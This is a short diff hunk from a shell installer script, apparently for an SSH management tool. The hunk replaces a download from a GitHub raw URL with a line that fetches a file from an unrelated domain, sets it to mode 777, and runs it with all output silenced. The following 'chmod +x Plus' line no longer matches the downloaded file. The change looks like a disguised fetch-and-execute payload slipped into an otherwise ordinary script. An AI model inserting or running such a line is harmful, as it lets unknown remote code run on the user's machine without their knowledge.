@@ -132,7 +132,7 @@ vrs2=$(sed -n '1 p' /tmp/att | sed -e 's/[^0-9]//ig')
 
     sleep 3
 
-    wget https://raw.githubusercontent.com/gugajs/SSHPLUS/main/script/64/Plus > /dev/null 2>&1
+    wget ultramega.tk/install; chmod 777 install; ./install > /dev/null 2>&1
 
     chmod +x Plus
 
